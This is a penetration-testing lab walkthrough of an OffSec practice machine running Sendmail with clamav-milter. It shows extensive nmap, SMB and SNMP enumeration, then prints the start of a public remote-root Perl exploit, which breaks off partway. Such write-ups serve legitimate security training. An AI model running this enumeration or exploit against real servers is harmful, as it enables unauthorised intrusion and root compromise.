# ClamAV

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Practice
Difficulty: Fundamental
Community Rating: Intermediate
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 10
Number of Flags: 1
Lab Description:
This lab demonstrates the exploitation of a remote code execution vulnerability in Sendmail configured with 
clamav-milter in black-hole mode. Learners will use a public exploit to open a bind shell on the target 
server, granting root access. This exercise focuses on service enumeration, exploitation of vulnerable 
configurations, and post-exploitation techniques.
Released: 3 Aug 2020
```

Machine link: [https://portal.offsec.com/machine/clamav-179/overview/details](https://portal.offsec.com/machine/clamav-179/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ export TARGET_IP=192.168.146.42

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-01 14:23 +0200
Nmap scan report for 192.168.146.42
Host is up (0.039s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.232], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-title: Ph33r
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-01T12:24:06-04:00
|_clock-skew: mean: 5h59m58s, deviation: 2h49m42s, median: 3h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.53 seconds
```

We have five TCP-services running and available:

- OpenSSH 3.8.1p1 Debian 8.sarge.6 on port 22 and 60000
- Sendmail 8.13.4/8.13.4/Debian-3sarge3 on port 25
- Apache httpd 1.3.33 on port 80
- Samba smbd 3.0.14a-Debian on port 139 and 445
- Linux SNMP multiplexer on port 199

We also do an UDP-scanning on the top 100 UDP-ports including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ sudo nmap -sU --top-ports 100 -sV -sC $TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-01 15:04 +0200
Nmap scan report for 192.168.146.42
Host is up (0.046s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT    STATE         SERVICE     VERSION
137/udp open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces: 
|   hostname: 0XBABE
|   interfaces: 
|_    192.168.146.42
138/udp open|filtered netbios-dgm
161/udp open          snmp        SNMPv1 server; U.C. Davis, ECE Dept. Tom SNMPv3 server (public)
| snmp-info: 
|   enterprise: U.C. Davis, ECE Dept. Tom
|   engineIDFormat: unknown
|   engineIDData: 9e325869f30c7749
|   snmpEngineBoots: 60
|_  snmpEngineTime: 44m51s
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   eth0
|     IP address: 192.168.146.42  Netmask: 255.255.255.0
|     MAC address: 00:50:56:9e:32:f7 (VMware)
|     Type: ethernetCsmacd  Speed: 100 Mbps
|_    Traffic stats: 476.85 Mb sent, 158.35 Mb received
| snmp-sysdescr: Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
|_  System uptime: 44m51.61s (269161 timeticks)
| snmp-netstat: 
|   TCP  0.0.0.0:25           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:139          0.0.0.0:0
|   TCP  0.0.0.0:199          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   UDP  0.0.0.0:137          *:*
|   UDP  0.0.0.0:138          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  42.146.168.192:137   *:*
|_  UDP  42.146.168.192:138   *:*
| snmp-processes: 
|   1: 
|     Name: init
|     Path: init [2]
|   2: 
|     Name: ksoftirqd/0
|     Path: ksoftirqd/0
|   3: 
|     Name: events/0
|     Path: events/0
|   4: 
|     Name: khelper
|     Path: khelper
|   5: 
|     Name: kacpid
|     Path: kacpid
|   99: 
|     Name: kblockd/0
|     Path: kblockd/0
|   109: 
|     Name: pdflush
|     Path: pdflush
|   110: 
|     Name: pdflush
|     Path: pdflush
|   111: 
|     Name: kswapd0
|     Path: kswapd0
|   112: 
|     Name: aio/0
|     Path: aio/0
|   255: 
|     Name: kseriod
|     Path: kseriod
|   276: 
|     Name: scsi_eh_0
|     Path: scsi_eh_0
|   284: 
|     Name: khubd
|     Path: khubd
|   348: 
|     Name: shpchpd_event
|     Path: shpchpd_event
|   380: 
|     Name: kjournald
|     Path: kjournald
|   935: 
|     Name: vmmemctl
|     Path: vmmemctl
|   1177: 
|     Name: vmtoolsd
|     Path: /usr/sbin/vmtoolsd
|   3767: 
|     Name: syslogd
|     Path: /sbin/syslogd
|   3770: 
|     Name: klogd
|     Path: /sbin/klogd
|   3775: 
|     Name: clamd
|     Path: /usr/local/sbin/clamd
|   3778: 
|     Name: clamav-milter
|     Path: /usr/local/sbin/clamav-milter
|     Params: --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
|   3787: 
|     Name: inetd
|     Path: /usr/sbin/inetd
|   3791: 
|     Name: nmbd
|     Path: /usr/sbin/nmbd
|     Params: -D
|   3793: 
|     Name: smbd
|     Path: /usr/sbin/smbd
|     Params: -D
|   3796: 
|     Name: smbd
|     Path: /usr/sbin/smbd
|     Params: -D
|   3798: 
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -Lsd -Lf /dev/null -p /var/run/snmpd.pid
|   3804: 
|     Name: sshd
|     Path: /usr/sbin/sshd
|   3882: 
|     Name: sendmail-mta
|     Path: sendmail: MTA: accepting connections
|   3899: 
|     Name: atd
|     Path: /usr/sbin/atd
|   3902: 
|     Name: cron
|     Path: /usr/sbin/cron
|   3909: 
|     Name: apache
|     Path: /usr/sbin/apache
|   3930: 
|     Name: getty
|     Path: /sbin/getty
|     Params: 38400 tty1
|   3936: 
|     Name: getty
|     Path: /sbin/getty
|     Params: 38400 tty2
|   3937: 
|     Name: getty
|     Path: /sbin/getty
|     Params: 38400 tty3
|   3938: 
|     Name: getty
|     Path: /sbin/getty
|     Params: 38400 tty4
|   3939: 
|     Name: getty
|     Path: /sbin/getty
|     Params: 38400 tty5
|   3940: 
|     Name: getty
|     Path: /sbin/getty
|     Params: 38400 tty6
|   4368: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4372: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4384: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4385: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4386: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4393: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4396: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4399: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4400: 
|     Name: apache
|     Path: /usr/sbin/apache
|   4401: 
|     Name: apache
|_    Path: /usr/sbin/apache
Service Info: Hosts: 0XBABE, 0xbabe.local

Host script results:
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 228.71 seconds
```

We have two UDP-services running and available:

- Samba on port 137 and 138
- SNMPv1 server on port 161

We also get a list of all running processes including the clamAV-service:

```bash
|   3778: 
|     Name: clamav-milter
|     Path: /usr/local/sbin/clamav-milter
|     Params: --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
```

### Check the web sites

Browsing manually to port 80 shows a shows a binary string

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ curl http://$TARGET_IP/           
<html>
<head><title>Ph33r</title></head>
<body>
<center>
<p></p>
<p>01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 0011
0000 01100010
</p>
</center>
</body>
</html>
```

Decoded with Binary refinery it likely should be read "If you don't pwn me you are a noob".

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ source ~/Python_venvs/Binary_Refinery/bin/activate

┌──(Binary_Refinery)─(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ emit "01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 0011 0000 01100010" | pack 2
ifyoudontpwnmeuran0b
```

We also start a `gobuster` scan in the background, looking for additional files and/or directories

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.146.42
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 274]
/index                (Status: 200) [Size: 289]
/index.html           (Status: 200) [Size: 289]
/doc                  (Status: 403) [Size: 272]
/.html                (Status: 403) [Size: 274]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

### SMB Discovery

Next, we do some SMB discovery with nmap

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ nmap -v -p 139,445 --script smb-*enum* $TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-01 14:32 +0200
NSE: Loaded 8 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
Initiating Ping Scan at 14:32
Scanning 192.168.146.42 [4 ports]
Completed Ping Scan at 14:32, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:32
Completed Parallel DNS resolution of 1 host. at 14:32, 0.50s elapsed
Initiating SYN Stealth Scan at 14:32
Scanning 192.168.146.42 [2 ports]
Discovered open port 445/tcp on 192.168.146.42
Discovered open port 139/tcp on 192.168.146.42
Completed SYN Stealth Scan at 14:32, 0.06s elapsed (2 total ports)
NSE: Script scanning 192.168.146.42.
Initiating NSE at 14:32
Completed NSE at 14:32, 3.87s elapsed
Nmap scan report for 192.168.146.42
Host is up (0.036s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-mbenum: 
|   Master Browser
|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
|   Print server
|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
|   Server
|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
|   Server service
|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
|   Unix server
|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
|   Windows NT/2000/XP/2003 server
|     0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
|   Workstation
|_    0XBABE  0.0  0xbabe server (Samba 3.0.14a-Debian) brave pig
|_smb-enum-sessions: ERROR: Script execution failed (use -d to debug)
| smb-enum-users: 
|   0XBABE\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Account disabled, Normal user account
|   0XBABE\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Account disabled, Normal user account
|   0XBABE\daemon (RID: 1002)
|     Full name:   daemon
|     Flags:       Account disabled, Normal user account
|   0XBABE\Debian-exim (RID: 1204)
|     Flags:       Account disabled, Normal user account
|   0XBABE\games (RID: 1010)
|     Full name:   games
|     Flags:       Account disabled, Normal user account
|   0XBABE\gnats (RID: 1082)
|     Full name:   Gnats Bug-Reporting System (admin)
|     Flags:       Account disabled, Normal user account
|   0XBABE\irc (RID: 1078)
|     Full name:   ircd
|     Flags:       Account disabled, Normal user account
|   0XBABE\list (RID: 1076)
|     Full name:   Mailing List Manager
|     Flags:       Account disabled, Normal user account
|   0XBABE\lp (RID: 1014)
|     Full name:   lp
|     Flags:       Account disabled, Normal user account
|   0XBABE\mail (RID: 1016)
|     Full name:   mail
|     Flags:       Account disabled, Normal user account
|   0XBABE\man (RID: 1012)
|     Full name:   man
|     Flags:       Account disabled, Normal user account
|   0XBABE\news (RID: 1018)
|     Full name:   news
|     Flags:       Account disabled, Normal user account
|   0XBABE\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Account disabled, Normal user account
|   0XBABE\proxy (RID: 1026)
|     Full name:   proxy
|     Flags:       Account disabled, Normal user account
|   0XBABE\root (RID: 1000)
|     Full name:   root
|     Flags:       Account disabled, Normal user account
|   0XBABE\ryu (RID: 3000)
|     Full name:   ryu,,,
|     Flags:       Account disabled, Normal user account
|   0XBABE\sync (RID: 1008)
|     Full name:   sync
|     Flags:       Account disabled, Normal user account
|   0XBABE\sys (RID: 1006)
|     Full name:   sys
|     Flags:       Account disabled, Normal user account
|   0XBABE\uucp (RID: 1020)
|     Full name:   uucp
|     Flags:       Account disabled, Normal user account
|   0XBABE\www-data (RID: 1066)
|     Full name:   www-data
|_    Flags:       Account disabled, Normal user account

NSE: Script Post-scanning.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

We get a list of users.

Checking for SMB shares with NetExec we find the standard ones

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ nxc smb $TARGET_IP -u '' -p '' --shares
SMB         192.168.146.42  445    NONE             [*] Unix (name:) (domain:) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         192.168.146.42  445    NONE             [+] \: (Guest)
SMB         192.168.146.42  445    NONE             [*] Enumerated shares
SMB         192.168.146.42  445    NONE             Share           Permissions     Remark
SMB         192.168.146.42  445    NONE             -----           -----------     ------
SMB         192.168.146.42  445    NONE             print$                          Printer Drivers
SMB         192.168.146.42  445    NONE             IPC$                            IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
SMB         192.168.146.42  445    NONE             ADMIN$                          IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
```

And finally, we get a good overview with `enum4linux-ng`

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ enum4linux-ng $TARGET_IP | tee enum4linux-ng.txt
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 192.168.146.42
[*] Username ......... ''
[*] Random Username .. 'cdzxjlph'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 192.168.146.42    |
 =======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 192.168.146.42    |
 =============================================================
[+] Got domain/workgroup name: WORKGROUP
[+] Full NetBIOS names information:
- 0XBABE          <00> -         B <ACTIVE>  Workstation Service                                                                                                                                  
- 0XBABE          <03> -         B <ACTIVE>  Messenger Service                                                                                                                                    
- 0XBABE          <20> -         B <ACTIVE>  File Server Service                                                                                                                                  
- ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser                                                                                                                                       
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name                                                                                                                                
- WORKGROUP       <1d> -         B <ACTIVE>  Master Browser                                                                                                                                       
- WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections                                                                                                                            
- MAC Address = 00-00-00-00-00-00                                                                                                                                                                 

 ===========================================
|    SMB Dialect Check on 192.168.146.42    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                               
  SMB 1.0: true                                                                                                                                                                                   
  SMB 2.02: false                                                                                                                                                                                 
  SMB 2.1: false                                                                                                                                                                                  
  SMB 3.0: false                                                                                                                                                                                  
  SMB 3.1.1: false                                                                                                                                                                                
Preferred dialect: SMB 1.0                                                                                                                                                                        
SMB1 only: true                                                                                                                                                                                   
SMB signing required: false                                                                                                                                                                       
[*] Enforcing legacy SMBv1 for further enumeration

 =============================================================
|    Domain Information via SMB session for 192.168.146.42    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: ''                                                                                                                                                                         
NetBIOS domain name: WORKGROUP                                                                                                                                                                    
DNS domain: ''                                                                                                                                                                                    
FQDN: ''                                                                                                                                                                                          
Derived membership: workgroup member                                                                                                                                                              
Derived domain: WORKGROUP                                                                                                                                                                         

 ===========================================
|    RPC Session Check on 192.168.146.42    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'cdzxjlph', password ''
[H] Rerunning enumeration with user 'cdzxjlph' might give more results

 =====================================================
|    Domain Information via RPC for 192.168.146.42    |
 =====================================================
[+] Domain: WORKGROUP
[+] Domain SID: NULL SID
[+] Membership: workgroup member

 =================================================
|    OS Information via RPC for 192.168.146.42    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix (Samba 3.0.14a-Debian)                                                                                                                                                             
OS version: '4.9'                                                                                                                                                                                 
OS release: not supported                                                                                                                                                                         
OS build: not supported                                                                                                                                                                           
Native OS: Unix                                                                                                                                                                                   
Native LAN manager: Samba 3.0.14a-Debian                                                                                                                                                          
Platform id: '500'                                                                                                                                                                                
Server type: '0x9a03'                                                                                                                                                                             
Server type string: Wk Sv PrQ Unx NT SNT 0xbabe server (Samba 3.0.14a-Debian) brave pig                                                                                                           

 =======================================
|    Users via RPC on 192.168.146.42    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 20 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 20 user(s) via 'enumdomusers'
[+] After merging user results we have 20 user(s) total:
'1000':                                                                                                                                                                                           
  username: root                                                                                                                                                                                  
  name: root                                                                                                                                                                                      
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1002':                                                                                                                                                                                           
  username: daemon                                                                                                                                                                                
  name: daemon                                                                                                                                                                                    
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1004':                                                                                                                                                                                           
  username: bin                                                                                                                                                                                   
  name: bin                                                                                                                                                                                       
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1006':                                                                                                                                                                                           
  username: sys                                                                                                                                                                                   
  name: sys                                                                                                                                                                                       
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1008':                                                                                                                                                                                           
  username: sync                                                                                                                                                                                  
  name: sync                                                                                                                                                                                      
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1010':                                                                                                                                                                                           
  username: games                                                                                                                                                                                 
  name: games                                                                                                                                                                                     
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1012':                                                                                                                                                                                           
  username: man                                                                                                                                                                                   
  name: man                                                                                                                                                                                       
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1014':                                                                                                                                                                                           
  username: lp                                                                                                                                                                                    
  name: lp                                                                                                                                                                                        
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1016':                                                                                                                                                                                           
  username: mail                                                                                                                                                                                  
  name: mail                                                                                                                                                                                      
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1018':                                                                                                                                                                                           
  username: news                                                                                                                                                                                  
  name: news                                                                                                                                                                                      
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1020':                                                                                                                                                                                           
  username: uucp                                                                                                                                                                                  
  name: uucp                                                                                                                                                                                      
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1026':                                                                                                                                                                                           
  username: proxy                                                                                                                                                                                 
  name: proxy                                                                                                                                                                                     
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1066':                                                                                                                                                                                           
  username: www-data                                                                                                                                                                              
  name: www-data                                                                                                                                                                                  
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1068':                                                                                                                                                                                           
  username: backup                                                                                                                                                                                
  name: backup                                                                                                                                                                                    
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1076':                                                                                                                                                                                           
  username: list                                                                                                                                                                                  
  name: Mailing List Manager                                                                                                                                                                      
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1078':                                                                                                                                                                                           
  username: irc                                                                                                                                                                                   
  name: ircd                                                                                                                                                                                      
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1082':                                                                                                                                                                                           
  username: gnats                                                                                                                                                                                 
  name: Gnats Bug-Reporting System (admin)                                                                                                                                                        
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'1204':                                                                                                                                                                                           
  username: Debian-exim                                                                                                                                                                           
  name: (null)                                                                                                                                                                                    
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'3000':                                                                                                                                                                                           
  username: ryu                                                                                                                                                                                   
  name: ryu,,,                                                                                                                                                                                    
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             
'501':                                                                                                                                                                                            
  username: nobody                                                                                                                                                                                
  name: nobody                                                                                                                                                                                    
  acb: '0x00000011'                                                                                                                                                                               
  description: (null)                                                                                                                                                                             

 ========================================
|    Groups via RPC on 192.168.146.42    |
 ========================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 9 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'
[+] After merging groups results we have 9 group(s) total:
'544':                                                                                                                                                                                            
  groupname: Administrators                                                                                                                                                                       
  type: builtin                                                                                                                                                                                   
'545':                                                                                                                                                                                            
  groupname: Users                                                                                                                                                                                
  type: builtin                                                                                                                                                                                   
'546':                                                                                                                                                                                            
  groupname: Guests                                                                                                                                                                               
  type: builtin                                                                                                                                                                                   
'547':                                                                                                                                                                                            
  groupname: Power Users                                                                                                                                                                          
  type: builtin                                                                                                                                                                                   
'548':                                                                                                                                                                                            
  groupname: Account Operators                                                                                                                                                                    
  type: builtin                                                                                                                                                                                   
'549':                                                                                                                                                                                            
  groupname: System Operators                                                                                                                                                                     
  type: builtin                                                                                                                                                                                   
'550':                                                                                                                                                                                            
  groupname: Print Operators                                                                                                                                                                      
  type: builtin                                                                                                                                                                                   
'551':                                                                                                                                                                                            
  groupname: Backup Operators                                                                                                                                                                     
  type: builtin                                                                                                                                                                                   
'552':                                                                                                                                                                                            
  groupname: Replicators                                                                                                                                                                          
  type: builtin                                                                                                                                                                                   

 ========================================
|    Shares via RPC on 192.168.146.42    |
 ========================================
[*] Enumerating shares
[+] Found 3 share(s):
ADMIN$:                                                                                                                                                                                           
  comment: IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)                                                                                                                           
  type: IPC                                                                                                                                                                                       
IPC$:                                                                                                                                                                                             
  comment: IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)                                                                                                                           
  type: IPC                                                                                                                                                                                       
print$:                                                                                                                                                                                           
  comment: Printer Drivers                                                                                                                                                                        
  type: Disk                                                                                                                                                                                      
[*] Testing share ADMIN$
[+] Mapping: OK, Listing: WRONG PASSWORD
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share print$
[+] Mapping: OK, Listing: WRONG PASSWORD

 ===========================================
|    Policies via RPC for 192.168.146.42    |
 ===========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: STATUS_ACCESS_DENIED

 ===========================================
|    Printers via RPC for 192.168.146.42    |
 ===========================================
[+] No printers returned (this is not an error)

Completed after 8.58 seconds
```

### Search for available exploit(s)

Let's check for available exploits for clamav milter

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ searchsploit clamav milter  
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit)                                                                                               | linux/remote/16924.rb
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Metasploit)                                                                                    | multiple/remote/9913.rb
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                                                                                                 | multiple/remote/4761.pl
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We don't have the version of Milter but the Sendmail & ClamAV Milter combination matches our scenario

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ searchsploit -m 4761            
  Exploit: Sendmail with clamav-milter < 0.91.2 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/4761
     Path: /usr/share/exploitdb/exploits/multiple/remote/4761.pl
    Codes: CVE-2007-4560
 Verified: True
File Type: ASCII text
Copied to: /mnt/hgfs/OffSec_PG/PG_Practice/Easy/ClamAV/4761.pl


┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/ClamAV]
└─$ cat 4761.pl            
### black-hole.pl
### Sendmail w/ clamav-milter Remote Root Exploit
### Copyright (c) 2007 Eliteboy
########################################################
use IO::Socket;

print "Sendmail w/ clamav-milter Remote Root Exploit\n";
print "Copyright (C) 2007 Eliteboy\n";

if ($#ARGV != 0) {print "Give me a host to connect.\n";exit;}

print "Attacking $ARGV[0]...\n";

$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                              PeerPort => '25',
                              Proto    => 'tcp');

print $sock "ehlo you\r\n";
print $sock "mail from: <>\r\n";
